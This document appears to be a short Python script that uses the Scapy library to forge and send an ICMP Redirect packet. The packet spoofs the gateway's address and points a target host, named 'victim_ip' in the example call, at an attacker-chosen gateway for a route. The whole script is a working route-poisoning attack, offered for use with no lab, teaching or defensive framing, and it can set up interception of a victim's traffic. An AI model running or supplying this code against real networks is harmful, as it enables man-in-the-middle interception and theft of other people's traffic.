from scapy.all import *

def icmp_redirect(target_ip, gateway_ip, route_entry, route_gateway):
    conf.verb = 0

    # Craft ICMP Redirect packet
    icmp_packet = ICMP(type=5, code=1, gw=route_gateway)

    # Craft IP packets
    ip_packet1 = IP(dst=target_ip, src=gateway_ip)
    ip_packet2 = IP(dst=route_entry, src=target_ip)

    # Send the packets
    send(ip_packet1/icmp_packet/ip_packet2)
    print("Sent ICMP Redirect packet to update route table.")

# Example usage:
icmp_redirect("victim_ip", "gateway_ip", "route_to_add", "route_gateway")
